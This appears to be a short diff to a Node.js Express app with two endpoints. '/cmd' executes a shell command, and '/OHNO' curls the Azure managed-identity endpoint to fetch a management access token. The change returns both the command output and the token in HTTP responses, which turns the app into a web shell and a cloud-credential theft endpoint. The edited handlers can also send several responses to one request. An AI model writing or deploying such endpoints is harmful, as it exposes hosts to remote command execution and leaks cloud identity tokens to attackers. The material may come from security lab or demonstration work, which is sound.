@@ -16,14 +16,12 @@ app.get('/cmd', (req, res) => {
   exec(cmd, (error, stdout, stderr) => {
 
     if (error) {
-	console.error(`Execution error: ${error.message}`);
-        process.exit(1);
+	res.send(`Execution error: ${error.message}`);
     }
     if (stderr) {
-        console.error(`stderr: ${stderr}`);
-        process.exit(1);
+        res.send(`stderr: ${stderr}`);
     }
-        console.log(`Current user: ${stdout.trim()}`);
+        res.send(`Current user: ${stdout.trim()}`);
      });
 })
 
@@ -33,14 +31,12 @@ app.get('/OHNO', (req, res) => {
   exec(`curl "${endpoint}?resource=https://management.azure.com&api-version=2019-08-01" -H X-IDENTITY-HEADER:${identity}`, (error, stdout, stderr) => {
 
     if (error) {
-	console.error(`Execution error: ${error.message}`);
-        process.exit(1);
+	res.send(`Execution error: ${error.message}`);
     }
     if (stderr) {
-        console.error(`stderr: ${stderr}`);
-        process.exit(1);
+        res.send(`stderr: ${stderr}`);
     }
-        console.log(`Current user: ${stdout.trim()}`);
+        res.send(`Current user: ${stdout.trim()}`);
      });
 })
 
